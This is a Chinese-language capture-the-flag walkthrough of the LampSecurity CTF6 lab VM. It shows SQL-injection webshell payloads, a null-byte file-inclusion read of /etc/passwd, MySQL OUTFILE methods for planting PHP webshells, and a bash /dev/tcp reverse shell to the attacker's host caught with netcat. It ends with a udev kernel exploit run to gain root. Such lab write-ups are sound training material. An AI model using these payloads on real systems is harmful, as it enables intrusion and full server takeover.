<p>看了一下日志，我们可以明显的发现这台机子显然被攻击过。仔细看看甚至里面已经有攻击者留下的后门了。</p>
<pre><code>2009-06-28 18:06:06	172.16.61.132 called id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\%27cmd\%27]);?%3E%27%20INTO%20OUTFILE%20%27/tmp/008st7845.php%27
</code></pre>
<p>但是他放在<code>/tmp</code>目录下，这该怎么访问到。。。<br>除非有本地文件包含漏洞。我们再仔细看看日志，果然看到上一个攻击者确实在尝试LFI漏洞。</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>我们挑几个的试试看看有没有成功的。</p>
<pre><code>2009-06-28 18:06:13	172.16.61.132 called actions/login.php?action=../conf/config.ini%00
</code></pre>
<p>这一条不就是之前在主页登录那块的请求吗。再一想，我们甚至还有index.php的源代码在之前的备份包里。</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
  <span class="token comment" spellcheck="true">/**
* This is the index page for the sample application. 
* This application is meant to be part of the PHP Code Auditing 
* course offered by SAS Information Security.  Don *not* install
* this application on a live server
* 
* @package PHP Code Auditing 
* @author Justin C. Klein Keane &lt;jukeane@sas.upenn.edu>
* 
**/</span>

  <span class="token comment" spellcheck="true">//make sure the app will run!</span>
  <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string">'inc/config_check.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$logged_in</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'logged_in'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'logged_in'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//get configuration variables</span>
<span class="token variable">$configs</span> <span class="token operator">=</span> <span class="token function">parse_ini_file</span><span class="token punctuation">(</span><span class="token string">'conf/config.ini'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Error parsing config file conf/config.ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//set up loggin</span>
<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string">'lib/log.class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$log</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//set up the db connection</span>
<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token variable">$configs</span><span class="token punctuation">[</span><span class="token string">'database_host'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$configs</span><span class="token punctuation">[</span><span class="token string">'database_user'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$configs</span><span class="token punctuation">[</span><span class="token string">'database_pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token variable">$log</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token function">mysqlerror</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$configs</span><span class="token punctuation">[</span><span class="token string">'database_db'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$action</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string">'default'</span><span class="token punctuation">;</span>
<span class="token variable">$valid_actions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
  <span class="token string">'default'</span><span class="token punctuation">,</span> 
  <span class="token string">'login'</span><span class="token punctuation">,</span> 
  <span class="token string">'add_event'</span><span class="token punctuation">,</span> 
  <span class="token string">'edit_event'</span><span class="token punctuation">,</span> 
  <span class="token string">'view_event'</span><span class="token punctuation">,</span> 
  <span class="token string">'delete_event'</span><span class="token punctuation">,</span> 
  <span class="token string">'logout'</span><span class="token punctuation">,</span>
  <span class="token string">'users'</span><span class="token punctuation">,</span>
  <span class="token string">'logs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//auth check</span>
<span class="token variable">$is_admin</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> '<span class="token constant">SELECT</span> user_id 
<span class="token constant">FROM</span> user 
<span class="token constant">WHERE</span> 
user_id <span class="token operator">=</span> <span class="token string">' . $_COOKIE['</span>user_id<span class="token string">'] . '</span> 
<span class="token keyword">AND</span> user_password <span class="token operator">=</span> \<span class="token string">''</span> <span class="token punctuation">.</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'\''</span><span class="token punctuation">;</span>
  <span class="token variable">$retval</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token variable">$log</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"Problem with sql $sql &lt;hr/>"</span> <span class="token punctuation">.</span> <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$retval</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token variable">$is_admin</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token variable">$admin_actions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'add_event'</span><span class="token punctuation">,</span> <span class="token string">'edit_event'</span><span class="token punctuation">,</span> <span class="token string">'view_event'</span><span class="token punctuation">,</span> <span class="token string">'delete_event'</span><span class="token punctuation">,</span> <span class="token string">'users'</span><span class="token punctuation">,</span> <span class="token string">'logs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span> <span class="token variable">$admin_actions</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token variable">$is_admin</span><span class="token punctuation">)</span> <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token string">'default'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span> <span class="token variable">$valid_actions</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token string">'default'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">!=</span> <span class="token string">'delete_event'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$action</span> <span class="token operator">!=</span> <span class="token string">'logout'</span><span class="token punctuation">)</span> 
  <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string">'inc/header.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string">'actions/'</span><span class="token punctuation">.</span><span class="token variable">$action</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string">'inc/footer.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第31和62行我们可以看到，典型的LFI漏洞，但是最后有个后缀名<code>.php</code>。看了下PHP版本，刚好可以通过零字符截断。<br>于是我们验证一下能不能成功</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf6/workSpace<span class="token punctuation">]</span>
└─$ curl <span class="token string">'http://192.168.56.140/actions/login.php?action=../../../../../../../../etc/passwd%00'</span>
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
rpm:x:37:37::/var/lib/rpm:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
avahi:x:70:70:Avahi daemon:/:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
distcache:x:94:94:Distcache:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
squid:x:23:23::/var/spool/squid:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
pcap:x:77:77::/var/arpwatch:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
dovecot:x:97:97:dovecot:/usr/libexec/dovecot:/sbin/nologin
john:x:500:500::/home/john:/bin/bash
linda:x:501:501::/home/linda:/bin/bash
fred:x:502:502::/home/fred:/bin/bash
molly:x:503:503::/home/molly:/bin/bash
toby:x:504:504::/home/toby:/bin/bash
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>发现，非常的OK。</p>
<p>所以，按道理，我们和同行一样构造<code>id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\%27cmd\%27]);?%3E%27%20INTO%20OUTFILE%20%27/tmp/008st7845.php%27</code>这样一条语句就可以注入一句话木马然后通过蚁剑连接了。<br>但是，既然都拿到phpmyadmin的管理员权限的账号了，我们不妨研究下怎么通过phpmyadmin向服务器插入webshell。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/sunjikui1255326447/article/details/106440534">上网查了查，主要三种方法能导出webshell</a>：</p>
<ol>
<li>日志法写入<blockquote>
<ul>
<li>Root数据库用户（root权限）</li>
<li>没有写入权限</li>
<li>magic_quotes_gpc：Off（关闭）</li>
</ul>
</blockquote>
</li>
</ol>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">"%genera%"</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//查询general_log配置以及log保存位置</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> general_log<span class="token operator">=</span><span class="token string">'on'</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//开启general log模式</span>
<span class="token keyword">SET</span> <span class="token keyword">global</span> general_log_file<span class="token operator">=</span><span class="token string">'D:/phpStudy/WWW/cmd.php'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//设置日志文件保存路径</span>
<span class="token keyword">SELECT</span> <span class="token string">'&lt;?php phpinfo();?>'</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//phpinfo()写入日志文件，exp写入reverse shell即可。</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> general_log<span class="token operator">=</span><span class="token string">'off'</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//关闭general_log模式</span>
<span class="token comment" spellcheck="true">// 访问设置的日志文件保存路径可以看到php被执行</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol start="2">
<li>直接插入<blockquote>
<ul>
<li>Root数据库用户（root权限）</li>
<li>网站绝对路径（确定有写入权限）</li>
<li>magic_quotes_gpc：Off（关闭）</li>
</ul>
</blockquote>
</li>
</ol>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;?php exec("/bin/bash -c \'bash -i >&amp; /dev/tcp/&lt;ip>/&lt;port> 0>&amp;1\'")?>'</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'/tmp/shell.php'</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol start="3">
<li>新建数据库插入<blockquote>
<p>1.Root数据库用户（root权限）<br>2.网站绝对路径（确定有写入权限）<br>3.magic_quotes_gpc：Off（开启）</p>
</blockquote>
</li>
</ol>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/*创建数据表导出shell*/</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>mysql<span class="token punctuation">`</span><span class="token punctuation">.</span><span class="token punctuation">`</span>user1<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>content<span class="token punctuation">`</span> <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token punctuation">`</span>mysql<span class="token punctuation">`</span><span class="token punctuation">.</span><span class="token punctuation">`</span>user1<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>content<span class="token punctuation">`</span> <span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'&lt;?php @eval($_POST[x123]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> <span class="token punctuation">`</span>content<span class="token punctuation">`</span> <span class="token keyword">FROM</span> <span class="token punctuation">`</span>user1<span class="token punctuation">`</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'C:\\phpStudy\\WWW\\xxx.php'</span><span class="token punctuation">;</span>
<span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span> <span class="token punctuation">`</span>user1<span class="token punctuation">`</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这台服务器上，general_log功能根本没有，直接第一条skip。<br>第二条试试。发现写入不到网页的各个目录，难怪前一个攻击者是写入<code>/tmp</code>目录下，看了下mysql的<code>tmpdir</code>，果然是<code>/tmp</code>，这玩意是只读的，只能在配置文件里改。我们只能捏着鼻子写进<code>/tmp</code>目录下了。</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;?php exec("/bin/bash -c \'bash -i >&amp; /dev/tcp/192.168.56.132/4444 0>&amp;1\'")?>'</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'/tmp/shell.php'</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然而我们组合技还有一个文件包含，我们直接通过LFI漏洞目录遍历请求我们的shell。</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># curl 192.168.56.140/actions/login.php?action=../../../../../../../../tmp/shell.php%00  </span>

┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nc -lvp 4444
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 4444 <span class="token punctuation">..</span>.
192.168.56.140: inverse host lookup failed: Host name lookup failure
connect to <span class="token punctuation">[</span>192.168.56.132<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>192.168.56.140<span class="token punctuation">]</span> 39860
bash: no job control <span class="token keyword">in</span> this shell
bash-3.2$ <span class="token function">whoami</span>    
apache
bash-3.2$ ip a
1: lo: <span class="token operator">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="token operator">></span> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <span class="token operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="token operator">></span> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:0c:29:5c:75:70 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.140/24 brd 192.168.56.255 scope global eth0
    inet6 fe80::20c:29ff:fe5c:7570/64 scope <span class="token function">link</span> 
       valid_lft forever preferred_lft forever
3: sit0: <span class="token operator">&lt;</span>NOARP<span class="token operator">></span> mtu 1480 qdisc noop 
    link/sit 0.0.0.0 brd 0.0.0.0
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>成功拿到shell。</p>
<h2 id="Privilge-Escalation"><a href="#Privilge-Escalation" class="headerlink" title="Privilge Escalation"></a>Privilge Escalation</h2><p>上来<code>sudo -l</code>，<code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code>,<code>crontab</code>都试过了。看了半天也没啥能用的。手动遍历下目录，<code>/home</code>下各用户home目录全是不可读写，想找点凭证没法了。再手动查看了下还是没啥有用的。<br>上<code>linpeas</code>，上来就标红了一条内核版本。但是不是很想走内核提权。先试试别的路径。<br>弄了半天，基本都试过一遍了，没辙了。回头看看内核提权吧。</p>
<pre class="line-numbers language-bash"><code class="language-bash">sh-3.2$ <span class="token function">uname</span> -a
Linux localhost.localdomain 2.6.18-92.el5 <span class="token comment" spellcheck="true">#1 SMP Tue Jun 10 18:49:47 EDT 2008 i686 i686 i386 GNU/Linux</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>在exp-db上搜了下Linux Kernal 2.6，从头开始试LPE的exp，试了快8个，都没成功，折磨疯了。<br>上网搜了一下发现<strong>Linux 2.6是有一个著名的内核提权漏洞</strong><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/8478"><strong>UDEV</strong></a>。<br>按他给的步骤先查看udev的pid，然后按网上给的方法先修补一下程序。结果执行多次仍然无法成功提权。</p>
<pre class="line-numbers language-bash"><code class="language-bash">bash-3.2$ <span class="token function">cat</span> /proc/net/netlink
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
cfebce00 0   0      00000000 0        0        00000000 2
cfc35a00 6   0      00000000 0        0        00000000 2
cfe78600 7   0      00000000 0        0        00000000 2
c1322200 9   2452   00000000 0        0        00000000 2
cfe66e00 9   0      00000000 0        0        00000000 2
cf557c00 10  0      00000000 0        0        00000000 2
cf518c00 11  0      00000000 0        0        00000000 2
cfc35400 15  568    ffffffff 0        0        00000000 2
cfebcc00 15  0      00000000 0        0        00000000 2
cf518a00 16  0      00000000 0        0        00000000 2
cf6c0c00 18  0      00000000 0        0        00000000 2
bash-3.2$ <span class="token function">sed</span> -i -e <span class="token string">'s/\r$//'</span> kernal2.6.sh
bash-3.2$ <span class="token function">chmod</span> +x kernal2.6.sh
bash-3.2$ ./kernal2.6.sh 568
suid.c: In <span class="token keyword">function</span> <span class="token string">'main'</span><span class="token keyword">:</span>
suid.c:3: warning: incompatible implicit declaration of built-in <span class="token keyword">function</span> <span class="token string">'execl'</span>
cp: `libno_ex.so.1.0<span class="token string">' and `/tmp/libno_ex.so.1.0'</span> are the same <span class="token function">file</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>重试一下，切成sh试试，不知道有没有影响。</p>
<pre class="line-numbers language-bash"><code class="language-bash">sh-3.2$ ./exp.sh 568
./exp.sh 568
suid.c: In <span class="token keyword">function</span> <span class="token string">'main'</span><span class="token keyword">:</span>
suid.c:3: warning: incompatible implicit declaration of built-in <span class="token keyword">function</span> <span class="token string">'execl'</span>
cp: `libno_ex.so.1.0<span class="token string">' and `/tmp/libno_ex.so.1.0'</span> are the same <span class="token function">file</span>
sh-3.2$ ./exp.sh 568
./exp.sh 568
suid.c: In <span class="token keyword">function</span> <span class="token string">'main'</span><span class="token keyword">:</span>
suid.c:3: warning: incompatible implicit declaration of built-in <span class="token keyword">function</span> <span class="token string">'execl'</span>
cp: `libno_ex.so.1.0<span class="token string">' and `/tmp/libno_ex.so.1.0'</span> are the same <span class="token function">file</span>
sh-3.2$ ./exp.sh 568
./exp.sh 568
suid.c: In <span class="token keyword">function</span> <span class="token string">'main'</span><span class="token keyword">:</span>
suid.c:3: warning: incompatible implicit declaration of built-in <span class="token keyword">function</span> <span class="token string">'execl'</span>
cp: `libno_ex.so.1.0<span class="token string">' and `/tmp/libno_ex.so.1.0'</span> are the same <span class="token function">file</span>
sh-3.2<span class="token comment" spellcheck="true"># whoami</span>
<span class="token function">whoami</span>
root
sh-3.2<span class="token comment" spellcheck="true"># ip a</span>
ip a
1: lo: <span class="token operator">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="token operator">></span> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <span class="token operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="token operator">></span> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:0c:29:5c:75:70 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.140/24 brd 192.168.56.255 scope global eth0
    inet6 fe80::20c:29ff:fe5c:7570/64 scope <span class="token function">link</span> 
       valid_lft forever preferred_lft forever
3: sit0: <span class="token operator">&lt;</span>NOARP<span class="token operator">></span> mtu 1480 qdisc noop 
    link/sit 0.0.0.0 brd 0.0.0.0
sh-3.2<span class="token comment" spellcheck="true">#</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>多试了几次之后成功提权了。<br>我的评价是内核提权是这样的，非常不稳定。主要这台靶机没有啥别的提权思路了，只能内核提权尝试了。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/05/24/pe_note/">← Next Privilege Escalation</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/24/LAMPSECURITY%20CTF5_my/">[vulnhub]  LampSec-CTF5 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nikto"><span class="toc-number">1.2.</span> <span class="toc-text">nikto</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E6%88%91%E4%BB%AC%E5%86%8D%E7%94%A8nikto%E6%89%AB%E4%B8%80%E6%89%AB%E6%BC%8F%E6%B4%9E%E7%9C%8B%E7%9C%8B%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BB%80%E4%B9%88%E9%81%97%E6%BC%8F%E7%9A%84%E3%80%82-96-96-96-bash%E2%94%8C%E2%94%80%E2%94%80-kali%E3%89%BFkali-x2F-vulnhub-x2F-LampSecurity-x2F-ctf6-x2F-workSpace-%E2%94%94%E2%94%80-sudo-nikto-h-192-168-56-140-Nikto-v2-5-0"><span class="toc-number">2.</span> <span class="toc-text">然后我们再用nikto扫一扫漏洞看看有没有什么遗漏的。&#96;&#96;&#96;bash┌──(kali㉿kali)-[~&#x2F;vulnhub&#x2F;LampSecurity&#x2F;ctf6&#x2F;workSpace]└─$ sudo nikto -h 192.168.56.140- Nikto v2.5.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilge-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilge Escalation</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script 